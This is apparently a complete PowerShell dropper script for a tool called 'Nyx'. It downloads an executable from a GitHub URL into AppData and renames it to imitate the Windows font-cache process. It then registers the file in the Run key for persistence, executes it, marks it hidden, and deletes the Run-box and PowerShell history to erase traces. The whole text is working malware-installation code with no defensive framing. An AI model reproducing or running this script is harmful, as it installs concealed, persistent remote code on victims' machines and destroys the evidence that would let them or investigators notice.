# Nyx - R5ZXPKL8

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "R5ZXPKL8" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/n3exsus/Nyx/main/R5ZXPKL8/R5ZXPKL8.exe -OutFile "$env:APPDATA\R5ZXPKL8\R5ZXPKL8.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\R5ZXPKL8\R5ZXPKL8.exe" -NewName "PresentationFondCache.exe"

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "R5ZXPKL8" `
-Value "$env:APPDATA\R5ZXPKL8\PresentationFondCache.exe"

# Run Nyx
& "$env:APPDATA\R5ZXPKL8\PresentationFondCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\R5ZXPKL8\PresentationFondCache.exe" -Force
$FILE.attributes='Hidden'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
